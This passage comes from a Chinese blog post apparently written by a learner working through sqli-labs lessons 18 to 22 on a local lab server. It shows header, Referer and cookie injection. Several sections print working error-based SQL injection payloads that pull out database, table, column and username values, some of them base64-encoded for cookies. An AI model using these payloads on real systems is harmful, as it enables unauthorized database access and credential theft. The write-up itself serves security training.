+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,database(),0x7e))and '1'='1</span><br></pre></td></tr></table></figure>
+
+<p>{&amp; asset_img 18db.png dbname&amp;}</p>
+<h2 id="表名-4"><a href="#表名-4" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Truncated incorrect DOUBLE value: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0’</p>
+</blockquote>
+<p>库名能出来其他出不来</p>
+<p>这就很难受</p>
+<hr>
+<h1 id="les19-POST-Header-Injection-Referer-Error-Based-string"><a href="#les19-POST-Header-Injection-Referer-Error-Based-string" class="headerlink" title="les19:POST-Header Injection- Referer- Error Based- string"></a>les19:POST-Header Injection- Referer- Error Based- string</h1><p><em>题目意思是头部referer处注入</em></p>
+<p>一开始用户名及密码都用admin1来成功登录后,发现有referer显示</p>
+<img src="/2019/07/25/sqli-labs-master/19admin1.png">
+
+<p>Referer:浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。</p>
+<p>例如：Referer: <a href="http://192.168.85.145/sqli-labs-master/Less-19/" target="_blank" rel="noopener">http://192.168.85.145/sqli-labs-master/Less-19/</a></p>
+<h2 id="库名-6"><a href="#库名-6" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,database(),0x7e)) and '1'='1</span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/19dbname.png" title="dbname">
+
+
+
+
+<h2 id="表名-5"><a href="#表名-5" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<p>这题跟les18很像,估计payload都是一样的,然而这题我也是只能爆出个库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>版权声明：上面这个payload为CSDN博主「wkend」的原创，遵循CC 4.0 by-sa版权协议，转载附上原文出处链接及此声明。<br>原文链接：<a href="https://blog.csdn.net/qq_34444097/article/details/83043678" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/83043678</a></p>
+</blockquote>
+<p>我用他的payload还是爆不出来…</p>
+<hr>
+<h1 id="les20-POST-Cookie-Injection-Error-Based-string"><a href="#les20-POST-Cookie-Injection-Error-Based-string" class="headerlink" title="les20:POST-Cookie Injection- Error Based- string"></a>les20:POST-Cookie Injection- Error Based- string</h1><p>admin1走一波</p>
+<img src="/2019/07/25/sqli-labs-master/20admin1.png">
+
+<h2 id="库名-7"><a href="#库名-7" class="headerlink" title="库名"></a>库名</h2><p>在抓包后forward到有cookie的地方后面加上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<p>其实用注释符#代替and ‘1’=’1也是可以的,只不过是前面两题用顺手了发现也行…</p>
+<img src="/2019/07/25/sqli-labs-master/20dbname.png" title="dbname">
+
+<h2 id="表名-6"><a href="#表名-6" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20tables.png" title="tables">
+
+<h2 id="列-3"><a href="#列-3" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<p>发现显示不完整</p>
+<p>于是不用group_concat,试着用limit一个一个爆出来</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20colum4.png" title="id">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20column5.png" title="username">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">5</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20column6.png" title="password">
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">6</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20no.png">
+
+<h2 id="值-3"><a href="#值-3" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/20username.png">
+
+<p>也是显示不全  也可以用上面的方法一个一个爆</p>
+<h1 id="les21-POST-Cookie-Injection-Error-Based-complex-string"><a href="#les21-POST-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="les21:POST-Cookie Injection- Error Based- complex - string"></a>les21:POST-Cookie Injection- Error Based- complex - string</h1><p>admin1操作及forward之后发现:</p>
+<blockquote>
+<p>Cookie: uname=YWRtaW4x</p>
+</blockquote>
+<p>查看源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br></pre></td></tr></table></figure>
+
+<p>是base64编码,找了一个网页工具验证</p>
+<img src="/2019/07/25/sqli-labs-master/21base64.png">
+
+<p>验证成功,知道是base64之后就可以把payload放进去编码了</p>
+<p>但是需要注意的是,还有一个地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>需要加上)来闭合</p>
+<h2 id="库名-8"><a href="#库名-8" class="headerlink" title="库名"></a>库名</h2><p>在Cookie: uname=YWRtaW4x后面加上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSkpIw==</span><br></pre></td></tr></table></figure>
+
+<p>奇怪的是,这样也可以</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JyBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkgYW5kICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后:</p>
+<blockquote>
+<p>‘ and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘1’=’1</p>
+</blockquote>
+<p>这个没有用注释符#,用的是and ‘1’=’1</p>
+<img src="/2019/07/25/sqli-labs-master/21dbname.png">
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其他的也是一样操作,进行base64编码再ctrl-v到Cookie: uname=YWRtaW4x后面就行</p>
+<h1 id="les22-POST-Cookie-Injection-Error-Based-Double-Quotes-string"><a href="#les22-POST-Cookie-Injection-Error-Based-Double-Quotes-string" class="headerlink" title="les22:POST-Cookie Injection- Error Based- Double Quotes - string"></a>les22:POST-Cookie Injection- Error Based- Double Quotes - string</h1><p>看了一下源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line"></span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>而les21的是没有cookee1的</p>
+<p>这就是les22跟les21不同的地方</p>
+<p>找到了不同点,可以开始注入了</p>
+<h2 id="库名-9"><a href="#库名-9" class="headerlink" title="库名"></a>库名</h2><p>在Cookie: uname=YWRtaW4x后面加上</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSkj</span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/22dbname.png">
+
+<p>les22竟然显示les21的图片…</p>
+<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli-labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/16/buuctf/" rel="next" title="BUUCTF记事本">
+                <i class="fa fa-chevron-left"></i> BUUCTF记事本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/27/本地图片显示不出来的坑/" rel="prev" title="本地图片显示不出来的解决方案">
+                本地图片显示不出来的解决方案 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">OC</p>
+              <p class="site-description motion-element" itemprop="description">what's your problem</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/OCgittt" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:771043260@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://impakho.com/" title="impakho" target="_blank">impakho</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.tk/" title="zo1ro" target="_blank">zo1ro</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.runikongjian.com/" title="WooRin" target="_blank">WooRin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ddstick.github.io/" title="DD" target="_blank">DD</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#les1-GET-Error-based-Single-quotes-String"><span class="nav-number">1.</span> <span class="nav-text">les1:GET-Error based-Single quotes-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les2-GET-Error-based-Intiger-based"><span class="nav-number">2.</span> <span class="nav-text">les2:GET-Error based -Intiger based</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les3-GET-Error-based-Single-quotes-with-twist-String"><span class="nav-number">3.</span> <span class="nav-text">les3:GET-Error based Single quotes with twist-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les4-GET-Error-based-Double-Quotes-String"><span class="nav-number">4.</span> <span class="nav-text">les4:GET-Error based Double Quotes-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les5-GET-Double-injection-Single-Quotes-String"><span class="nav-number">5.</span> <span class="nav-text">les5:GET-Double injection-Single Quotes-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les6-GET-Double-injection-Double-Quotes-String"><span class="nav-number">6.</span> <span class="nav-text">les6:GET-Double injection-Double Quotes-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les7-GET-Dump-into-Outfile"><span class="nav-number">7.</span> <span class="nav-text">les7:GET-Dump into Outfile</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les8-GET-Blind-Boolian-Single-Quotes-String"><span class="nav-number">8.</span> <span class="nav-text">les8:GET-Blind- Boolian- Single Quotes- String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les9-GET-Blind-Time-based-Single-Quotes-String"><span class="nav-number">9.</span> <span class="nav-text">les9:GET- Blind- Time based- Single Quotes- String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les10-GET-Blind-Time-based-Double-Quotes-String"><span class="nav-number">10.</span> <span class="nav-text">les10:GET-Blind- Time based- Double Quotes- String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les11-POST-Error-Based-Single-quotes-String"><span class="nav-number">11.</span> <span class="nav-text">les11:POST-Error Based-Single quotes-String</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les12-POST-Error-Based-Double-quotes-String"><span class="nav-number">12.</span> <span class="nav-text">les12:POST-Error Based- Double quotes- String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#猜语句"><span class="nav-number">12.1.</span> <span class="nav-text">猜语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#猜列数"><span class="nav-number">12.2.</span> <span class="nav-text">猜列数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他步骤"><span class="nav-number">12.3.</span> <span class="nav-text">其他步骤</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les13-POST-Double-Injection-String-with-twist"><span class="nav-number">13.</span> <span class="nav-text">les13:POST-Double Injection- String- with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#猜语句-1"><span class="nav-number">13.1.</span> <span class="nav-text">猜语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#库名"><span class="nav-number">13.2.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名"><span class="nav-number">13.3.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列"><span class="nav-number">13.4.</span> <span class="nav-text">列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#值"><span class="nav-number">13.5.</span> <span class="nav-text">值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les14-POST-Double-injection-Single-quotes-String-with-twist"><span class="nav-number">14.</span> <span class="nav-text">les14:POST-Double-injection-Single quotes-String-with twist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-1"><span class="nav-number">14.1.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-1"><span class="nav-number">14.2.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列-1"><span class="nav-number">14.3.</span> <span class="nav-text">列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#值-1"><span class="nav-number">14.4.</span> <span class="nav-text">值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les15-POST-Blind-Boolian-Based-String"><span class="nav-number">15.</span> <span class="nav-text">les15:POST-Blind- Boolian Based- String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#猜语句-2"><span class="nav-number">15.1.</span> <span class="nav-text">猜语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-2"><span class="nav-number">15.2.</span> <span class="nav-text">库名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#库名第一个字母"><span class="nav-number">15.2.1.</span> <span class="nav-text">库名第一个字母:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#库名-3"><span class="nav-number">15.2.2.</span> <span class="nav-text">库名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-2"><span class="nav-number">15.3.</span> <span class="nav-text">表名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#表名的第一个字母"><span class="nav-number">15.3.1.</span> <span class="nav-text">表名的第一个字母</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个表名"><span class="nav-number">15.3.2.</span> <span class="nav-text">第一个表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个表名"><span class="nav-number">15.3.3.</span> <span class="nav-text">第二个表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三个表名"><span class="nav-number">15.3.4.</span> <span class="nav-text">第三个表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四个表名"><span class="nav-number">15.3.5.</span> <span class="nav-text">第四个表名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列-2"><span class="nav-number">15.4.</span> <span class="nav-text">列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一列"><span class="nav-number">15.4.1.</span> <span class="nav-text">第一列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二列"><span class="nav-number">15.4.2.</span> <span class="nav-text">第二列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三列"><span class="nav-number">15.4.3.</span> <span class="nav-text">第三列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第四列"><span class="nav-number">15.4.4.</span> <span class="nav-text">第四列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第五列"><span class="nav-number">15.4.5.</span> <span class="nav-text">第五列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第六列"><span class="nav-number">15.4.6.</span> <span class="nav-text">第六列</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#username值"><span class="nav-number">15.5.</span> <span class="nav-text">username值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个值"><span class="nav-number">15.5.1.</span> <span class="nav-text">第一个值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#……"><span class="nav-number">15.5.2.</span> <span class="nav-text">……</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#……-1"><span class="nav-number">15.5.3.</span> <span class="nav-text">……</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les16-POST-Blind-Boolian-time-Based-Double-quotes"><span class="nav-number">16.</span> <span class="nav-text">les16:POST-Blind-Boolian/time Based-Double quotes</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les17-POST-Update-Query-Error-based-String"><span class="nav-number">17.</span> <span class="nav-text">les17:POST-Update Query- Error based - String</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#猜语句-3"><span class="nav-number">17.1.</span> <span class="nav-text">猜语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-4"><span class="nav-number">17.2.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-3"><span class="nav-number">17.3.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列名"><span class="nav-number">17.4.</span> <span class="nav-text">列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#值-2"><span class="nav-number">17.5.</span> <span class="nav-text">值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les18-POST-Header-Injection-Uagent-field-Error-based"><span class="nav-number">18.</span> <span class="nav-text">les18:POST-Header Injection-Uagent field-Error based</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#搜索"><span class="nav-number">18.1.</span> <span class="nav-text">搜索</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Agent头字段"><span class="nav-number">18.1.1.</span> <span class="nav-text">User-Agent头字段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#看语句"><span class="nav-number">18.2.</span> <span class="nav-text">看语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-5"><span class="nav-number">18.3.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-4"><span class="nav-number">18.4.</span> <span class="nav-text">表名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les19-POST-Header-Injection-Referer-Error-Based-string"><span class="nav-number">19.</span> <span class="nav-text">les19:POST-Header Injection- Referer- Error Based- string</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-6"><span class="nav-number">19.1.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-5"><span class="nav-number">19.2.</span> <span class="nav-text">表名</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les20-POST-Cookie-Injection-Error-Based-string"><span class="nav-number">20.</span> <span class="nav-text">les20:POST-Cookie Injection- Error Based- string</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-7"><span class="nav-number">20.1.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#表名-6"><span class="nav-number">20.2.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#列-3"><span class="nav-number">20.3.</span> <span class="nav-text">列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#值-3"><span class="nav-number">20.4.</span> <span class="nav-text">值</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les21-POST-Cookie-Injection-Error-Based-complex-string"><span class="nav-number">21.</span> <span class="nav-text">les21:POST-Cookie Injection- Error Based- complex - string</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-8"><span class="nav-number">21.1.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">21.2.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#les22-POST-Cookie-Injection-Error-Based-Double-Quotes-string"><span class="nav-number">22.</span> <span class="nav-text">les22:POST-Cookie Injection- Error Based- Double Quotes - string</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#库名-9"><span class="nav-number">22.1.</span> <span class="nav-text">库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他-1"><span class="nav-number">22.2.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">OC</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
